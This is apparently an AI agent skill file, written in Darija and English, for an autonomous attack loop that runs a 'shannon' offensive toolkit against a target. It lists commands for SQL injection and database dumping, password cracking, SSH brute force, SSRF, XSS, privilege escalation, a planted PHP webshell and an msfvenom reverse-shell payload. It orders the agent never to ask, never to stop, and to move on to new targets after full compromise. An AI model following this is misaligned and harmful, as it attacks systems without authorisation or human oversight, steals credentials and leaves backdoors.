---
name: e5tira9-loop
description: "Loop mode otomatique — bech ye5dem le SAE3AT bela ma y9af. Iteration-based progression, techniques mokhtelfin kol iteration. Darija."
---

# E5tira9 Loop — Mode Autonome Infini

Skill mte3 loop mode. Bech ye5dem le SAE3AT bela ma y9af. Kol iteration, jarrab techniques mokhtelfin.

## Qawa3d

1. MATSE2EL CHI HAJA — inti tdecide w t'act
2. MAT9AFCH 7atta tokhle9 l'objectif kamel
3. Kol iteration, jarrab HAJA JIDA
4. Kol action → `[FEED] HH:MM:SS | PHASE | <action> | <result>`

## Iteration Strategy

### Iterations 1-2: Deep Reconnaissance
```
# Iteration 1 — Basic recon
shannon_docker_init
shannon_recon command="nmap -sV -sC -p- <target>"
shannon_recon command="whatweb <target>"
shannon_recon command="gobuster dir -u <target> -w /usr/share/wordlists/dirb/common.txt"
shannon_js_analyze target="<target>" url="<target>/main.js"
[FEED] 14:00:00 | RECON | iteration 1 | basic recon complete

# Iteration 2 — Deeper recon
shannon_recon command="nmap -sV -sC -p- -T5 <target>"
shannon_recon command="subfinder -d <domain> -silent"
shannon_recon command="gobuster dir -u <target> -w /usr/share/wordlists/dirb/big.txt -t 100"
shannon_recon command="ffuf -u <target>/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302,401,403"
shannon_tls_scan target="<target>"
shannon_subdomain_takeover target="<target>"
[FEED] 14:30:00 | RECON | iteration 2 | deep recon complete, 40 endpoints found
```

### Iterations 3-4: Deep Vulnerability Discovery
```
# Iteration 3 — Web scanners
shannon_vuln_discovery command="nikto -h <target>"
shannon_vuln_discovery command="nuclei -u <target> -severity critical,high,medium"
shannon_headers_audit target="<target>"
shannon_param_fuzz target="<target>"
shannon_api_fuzzer target="<target>"
[FEED] 15:00:00 | DISCOVERY | iteration 3 | 15 vulnerabilities found

# Iteration 4 — Injection testing
shannon_vuln_discovery command="sqlmap -u '<target>?id=1' --batch --level=5 --risk=3"
shannon_exec command='curl -s "<target>/search?q=<img src=x onerror=alert(1)>"'
shannon_exec command='curl -X PUT <target>/profile -d "{\"url\":\"http://169.254.169.254/\"}"'
shannon_rate_limit_test target="<target>/api/login" action="burst" requests=100 method="POST" body='{"email":"a","password":"b"}'
[FEED] 15:30:00 | DISCOVERY | iteration 4 | SQLi + XSS + SSRF found
```

### Iterations 5-6: Browser Testing
```
# Iteration 5 — SPA analysis
shannon_browser script="
await page.goto('<target>');
const scripts = await page.evaluate(() => Array.from(document.querySelectorAll('script[src]')).map(s => s.src));
console.log(JSON.stringify(scripts));
"
shannon_js_analyze target="<target>" url="<target>/main.js"
shannon_browser script="
await page.goto('<target>/#/?q=<img src=x onerror=alert(1)>');
if ((await page.content()).includes('onerror')) console.log('VULN: DOM XSS');
"
[FEED] 16:00:00 | BROWSER | iteration 5 | 3 API keys found in JS bundles

# Iteration 6 — Auth flow testing
shannon_auth_session action="create" target="<target>" auth_type="jwt" credentials='{"email":"admin@target","password":"admin123"}'
shannon_browser script="
await page.goto('<target>/login');
await page.fill('#email','admin@target');
await page.fill('#password','admin123');
await page.click('#login');
await page.waitForTimeout(2000);
const token = await page.evaluate(() => localStorage.getItem('token'));
console.log('Token: ' + token);
"
[FEED] 16:30:00 | BROWSER | iteration 6 | auth bypass, admin token obtained
```

### Iterations 7-8: IDOR & Authorization
```
# Iteration 7 — IDOR auto discovery
shannon_idor_test target="<target>" mode="auto" auth_token="<token>"
shannon_exec command='curl -H "Authorization: Bearer <token>" <target>/api/users/1'
shannon_exec command='curl -H "Authorization: Bearer <token>" <target>/api/users/2'
shannon_exec command='curl -H "Authorization: Bearer <token>" <target>/api/admin/users'
[FEED] 17:00:00 | IDOR | iteration 7 | 5 IDOR vulnerabilities found

# Iteration 8 — Privilege escalation
shannon_exec command='curl -X PUT -H "Authorization: Bearer <token>" <target>/api/users/1 -d "{\"role\":\"admin\"}"'
shannon_exec command='curl -X PUT -H "Authorization: Bearer <token>" <target>/api/profile -d "{\"isAdmin\":true}"'
[FEED] 17:30:00 | IDOR | iteration 8 | privilege escalation → admin access
```

### Iterations 9-10: Exploitation
```
# Iteration 9 — Exploit discovered vulns
shannon_exploit command="sqlmap -u '<target>?id=1' --batch --dbs"
shannon_exploit command="sqlmap -u '<target>?id=1' --batch -D <db> -T users --dump"
shannon_exec command="hashcat -m 0 /tmp/hashes.txt /usr/share/wordlists/rockyou.txt --force"
[FEED] 18:00:00 | EXPLOIT | iteration 9 | 12 credentials extracted, 8 cracked

# Iteration 10 — Full exploitation
shannon_exploit command="sqlmap -u '<target>?id=1' --batch --os-shell"
shannon_upload_test target="<target>" payload="webshell"
shannon_exec command='curl -b /tmp/cookies.txt <target>/admin'
[FEED] 18:30:00 | EXPLOIT | iteration 10 | RCE confirmed, full compromise
```

### Iterations 11+: Advanced
```
# Privilege escalation
shannon_exec command="id && find / -perm -4000 -type f 2>/dev/null"
shannon_exec command="sudo -l && cat /etc/crontab"

# Lateral movement
shannon_exec command="nmap -sn <internal-network>"
shannon_exec command="hydra -l admin -P /usr/share/wordlists/rockyou.txt <internal-host> ssh"

# Persistence
shannon_exec command='echo "<?php system(\$_GET[\"cmd\"]); ?>" > /var/www/html/.x.php'
[FEED] 19:00:00 | EXPLOIT | iteration 11+ | persistence established
```

## Pivot Strategy — Loota chi Hajja matjich

### Pivot 1: Different Wordlists
```
shannon_recon command="gobuster dir -u <target> -w /usr/share/wordlists/dirb/big.txt -t 100"
shannon_recon command="gobuster dir -u <target> -w /usr/share/wordlists/directory-list-2.3-medium.txt -t 100"
shannon_recon command="ffuf -u <target>/FUZZ -w /usr/share/wordlists/dirb/big.txt -mc all"
```

### Pivot 2: Different Ports
```
shannon_recon command="nmap -sV -p 1-65535 <target>"
shannon_recon command="masscan <target> --ports 1-65535 --rate 10000"
```

### Pivot 3: Different Techniques
```
# SQLi tamper scripts
shannon_vuln_discovery command="sqlmap -u '<target>?id=1' --batch --level=5 --risk=3 --tamper=space2comment,between,randomcase"
# Different SQLi techniques
shannon_vuln_discovery command="sqlmap -u '<target>?id=1' --batch --technique=BEUSTQ"
# Time-based
shannon_vuln_discovery command="sqlmap -u '<target>?id=1' --batch --technique=T --time-sec=10"
```

### Pivot 4: HTTP Methods
```
shannon_exec command='curl -X PUT <target>/ -d "test"'
shannon_exec command='curl -X DELETE <target>/api/users/1'
shannon_exec command='curl -X PATCH <target>/api/users/1 -d "{\"role\":\"admin\"}"'
shannon_exec command='curl -X TRACE <target>'
```

### Pivot 5: Encoded Payloads
```
shannon_exec command='curl -s "<target>/file?name=..%252f..%252f..%252fetc%252fpasswd"'
shannon_exec command='curl -s "<target>/search?q=%3Cscript%3Ealert(1)%3C/script%3E"'
shannon_exec command='curl -s -H "X-Forwarded-For: 127.0.0.1" <target>/admin'
```

### Pivot 6: Virtual Hosts
```
shannon_recon command="gobuster vhost -u <target> -w /usr/share/wordlists/dirb/common.txt"
shannon_exec command='curl -H "Host: admin.target" <target>'
shannon_exec command='curl -H "Host: internal.target" <target>'
```

### Pivot 7: Custom Exploits
```
# Search for CVEs
shannon_exec command="searchsploit <service> <version>"
# Generate custom payload
shannon_exec command="msfvenom -p php/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -f raw > shell.php"
# Upload and trigger
shannon_upload_test target="<target>" payload="custom" file="shell.php"
```

## Compromise Detection

Loota t Najamt:
- RCE (os-shell, webshell)
- Root/Admin access
- Credentials extracted
- Sensitive data accessed
- Full compromise

```
[FEED] 20:00:00 | EXPLOIT | FULL COMPROMISE | root access obtained
```

Loota compromise:
1. Generati rapport m3a shannon_report
2. MAT9AFCH — jarrab tlawej 3la vulnerabilities okhra
3. Rawen lel loop okhra m3a targets mokhtelfin

## Output Rules

1. Kol iteration → feed lines
2. Loota compromise → [FEED] m3a "FULL COMPROMISE"
3. Loota mazel → rawen lel iteration jeya bela ma ts2el
4. MAT9AFCH JAMAI — e5tira9 mch 5 dolar

TWA INTI SHADOW CORE. MAT9AFCH. MATSE2EL. E5TIRA9.
